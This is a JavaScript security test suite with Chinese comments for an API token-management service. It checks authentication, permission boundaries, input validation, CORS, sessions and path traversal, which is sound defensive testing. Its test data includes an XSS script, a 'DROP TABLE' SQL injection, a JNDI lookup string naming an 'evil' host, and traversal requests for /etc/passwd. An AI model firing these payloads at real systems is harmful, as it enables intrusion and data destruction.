import { TestRunner, BASE, assert, assertEq, assertStatus } from '../test-utils.mjs'

async function run() {
  const t = new TestRunner('安全测试')
  await t.setup({ login: true })
  const { api, page } = t

  // ================================================================
  //  1. 未认证访问控制
  // ================================================================
  await t.section('1. 未认证访问控制', async () => {
    const protectedEndpoints = [
      ['GET',  '/api/user/self',           '个人信息'],
      ['GET',  '/api/user/?p=0&size=10',   '用户列表'],
      ['GET',  '/api/channel/?p=0&size=10','渠道列表'],
      ['GET',  '/api/token/?p=0&size=10',  '令牌列表'],
      ['GET',  '/api/option/',             '系统选项'],
      ['GET',  '/api/log/?p=0&size=10',    '日志列表'],
      ['GET',  '/api/redemption/?p=0&size=10', '兑换码列表'],
      ['GET',  '/api/performance/stats',   '性能统计'],
      ['GET',  '/api/system-task/list',    '系统任务'],
      ['GET',  '/api/system-info/instances','系统实例'],
      ['POST', '/api/token/',              '创建令牌'],
      ['POST', '/api/channel/',            '创建渠道'],
      ['PUT',  '/api/option/',             '更新设置'],
      ['DELETE','/api/token/1',            '删除令牌'],
    ]

    for (const [method, path, desc] of protectedEndpoints) {
      await t.test(`unauth:${method.toLowerCase()}:${desc}`, async () => {
        let resp
        const url = `${BASE}${path}`
        switch (method) {
          case 'GET':    resp = await page.request.get(url); break
          case 'POST':   resp = await page.request.post(url, { data: {} }); break
          case 'PUT':    resp = await page.request.put(url, { data: {} }); break
          case 'DELETE': resp = await page.request.delete(url); break
        }
        const status = resp.status()
        assert(status === 401 || status === 403, `${desc} 无认证应返回 401/403, 实际: ${status}`)
      })
    }
  })

  // ================================================================
  //  2. 权限边界测试
  // ================================================================
  await t.section('2. 权限边界', async () => {
    await t.test('perm:other_user_token', async () => {
      const resp = await api.get(`${BASE}/api/token/99999`)
      const body = await resp.json()
      assert(resp.status() === 200 || resp.status() === 404 || body.success === false,
        '访问不存在的令牌应返回 404 或 success=false')
    })

    await t.test('perm:other_user_delete', async () => {
      const resp = await api.del(`${BASE}/api/token/99999`)
      const body = await resp.json()
      assert(body.success === false || resp.status() === 404,
        '删除不存在的令牌应失败')
    })

    await t.test('perm:update_nonexist_token', async () => {
      const resp = await api.put(`${BASE}/api/token/`, {
        data: { id: 99999, name: 'hacked' }
      })
      const body = await resp.json()
      assert(body.success === false, '更新不存在的令牌应失败')
    })
  })

  // ================================================================
  //  3. 输入验证测试
  // ================================================================
  await t.section('3. 输入验证', async () => {
    await t.test('input:xss_in_token_name', async () => {
      const xssPayload = '<script>alert("xss")</script>'
      const resp = await api.post(`${BASE}/api/token/`, {
        data: { name: xssPayload, expired_time: -1, unlimited_quota: true }
      })
      const status = resp.status()
      assert(status < 500, `XSS payload 不应导致服务器 500 错误`)
      const body = await resp.json()
      if (body.success !== false) {
        const listResp = await api.get(`${BASE}/api/token/?p=0&size=100`)
        const tokens = (await listResp.json()).data?.items || []
        const token = tokens.find(t => t.name === xssPayload)
        if (token) await api.del(`${BASE}/api/token/${token.id}`)
      }
    })

    await t.test('input:sql_injection_search', async () => {
      const sqlPayload = "'; DROP TABLE tokens; --"
      const resp = await api.get(`${BASE}/api/token/search?keyword=${encodeURIComponent(sqlPayload)}`)
      assertEq(resp.status(), 200, 'SQL 注入搜索应正常处理，不应崩溃')
    })

    await t.test('input:oversized_token_name', async () => {
      const longName = 'x'.repeat(10000)
      const resp = await api.post(`${BASE}/api/token/`, {
        data: { name: longName, expired_time: -1, unlimited_quota: true }
      })
      const body = await resp.json()
      assert(body.success === false, '超长名称应被拒绝')
    })

    await t.test('input:negative_quota', async () => {
      const resp = await api.post(`${BASE}/api/token/`, {
        data: { name: 'neg-test', expired_time: -1, unlimited_quota: false, remain_quota: -999999 }
      })
      const body = await resp.json()
      if (body.success !== false) {
        const listResp = await api.get(`${BASE}/api/token/?p=0&size=100`)
        const tokens = (await listResp.json()).data?.items || []
        const token = tokens.find(t => t.name === 'neg-test')
        if (token) {
          assert(token.remain_quota >= 0, '负额度不应被接受')
          await api.del(`${BASE}/api/token/${token.id}`)
        }
      }
    })

    await t.test('input:invalid_json', async () => {
      const resp = await page.request.post(`${BASE}/api/token/`, {
        headers: { ...t.H, 'Content-Type': 'application/json' },
        data: 'not-valid-json{{{',
      })
      assert(resp.status() < 500, '无效 JSON 不应导致 500 错误')
    })

    await t.test('input:empty_body', async () => {
      const resp = await api.post(`${BASE}/api/token/`, { data: {} })
      assert(resp.status() < 500, '空请求体不应导致 500 错误')
    })

    await t.test('input:batch_create_huge', async () => {
      const names = Array.from({ length: 51 }, (_, i) => `overflow-${i}`)
      const resp = await api.post(`${BASE}/api/token/batch/create`, {
        data: { names, expired_time: -1, unlimited_quota: true }
      })
      const body = await resp.json()
      assert(body.success === false, '超过 50 个令牌批量创建应被拒绝')
    })

    await t.test('input:batch_edit_huge_ids', async () => {
      const ids = Array.from({ length: 101 }, (_, i) => i + 1)
      const resp = await api.put(`${BASE}/api/token/batch`, {
        data: { ids, group: 'overflow' }
      })
      const body = await resp.json()
      assert(body.success === false, '超过 100 个 ID 批量编辑应被拒绝')
    })

    await t.test('input:special_chars_in_search', async () => {
      const specials = ['%00', '\\x00', '${jndi:ldap://evil}', '{{7*7}}']
      for (const s of specials) {
        const resp = await api.get(`${BASE}/api/token/search?keyword=${encodeURIComponent(s)}`)
        assert(resp.status() < 500, `特殊字符 "${s}" 不应导致 500 错误`)
      }
    })
  })

  // ================================================================
  //  4. CORS 测试
  // ================================================================
  await t.section('4. CORS', async () => {
    await t.test('cors:options_request', async () => {
      const resp = await page.request.fetch(`${BASE}/api/status`, {
        method: 'OPTIONS',
        headers: { 'Origin': 'https://evil.example.com', 'Access-Control-Request-Method': 'GET' }
      })
      const corsHeader = resp.headers()['access-control-allow-origin']
      if (corsHeader) {
        assert(corsHeader === '*' || corsHeader === 'https://evil.example.com',
          `CORS 应返回 * 或匹配的 Origin，实际: ${corsHeader}`)
      }
    })
  })

  // ================================================================
  //  5. HTTP 方法测试
  // ================================================================
  await t.section('5. HTTP 方法安全', async () => {
    await t.test('method:patch_not_allowed', async () => {
      const resp = await page.request.patch(`${BASE}/api/token/`, {
        data: { id: 1, name: 'patched' }
      })
      assert(resp.status() !== 200 || (await resp.json()).success === false,
        'PATCH 不应在令牌端点生效')
    })

    await t.test('method:get_with_body', async () => {
      const resp = await api.get(`${BASE}/api/status`)
      assertEq(resp.status(), 200, 'GET 请求应正常工作')
    })
  })

  // ================================================================
  //  6. Session 管理
  // ================================================================
  await t.section('6. Session 管理', async () => {
    await t.test('session:logout_invalidates', async () => {
      const beforeResp = await api.get(`${BASE}/api/user/self`)
      const beforeBody = await beforeResp.json()
      assert(beforeBody.success !== false || beforeResp.status() === 200, '登出前应能访问')

      await page.request.get(`${BASE}/api/user/logout`)

      const afterResp = await page.request.get(`${BASE}/api/user/self`)
      const afterStatus = afterResp.status()
      assert(afterStatus === 401 || (await afterResp.json()).success === false,
        '登出后访问应失败')
    })

    await t.test('session:re_login', async () => {
      await t.login()
      const resp = await api.get(`${BASE}/api/user/self`)
      const body = await resp.json()
      assert(body.success !== false, '重新登录后应能访问')
    })
  })

  // ================================================================
  //  7. 路径遍历测试
  // ================================================================
  await t.section('7. 路径安全', async () => {
    await t.test('path:traversal', async () => {
      const resp = await page.request.get(`${BASE}/api/../../../etc/passwd`)
      assert(resp.status() !== 200 || !(await resp.text()).includes('root:'),
        '路径遍历不应泄露系统文件')
    })

    await t.test('path:double_encoding', async () => {
      const resp = await page.request.get(`${BASE}/api/%2e%2e/%2e%2e/etc/passwd`)
      assert(resp.status() !== 200 || !(await resp.text()).includes('root:'),
        '双重编码路径遍历不应泄露系统文件')
    })

    await t.test('path:null_byte', async () => {
      const resp = await page.request.get(`${BASE}/api/status%00.json`)
      assert(resp.status() < 500, 'null byte 不应导致 500')
    })
  })

  await t.teardown()
  t.report()
  t.exit()
}

run().catch(e => { console.error(e); process.exit(1) })
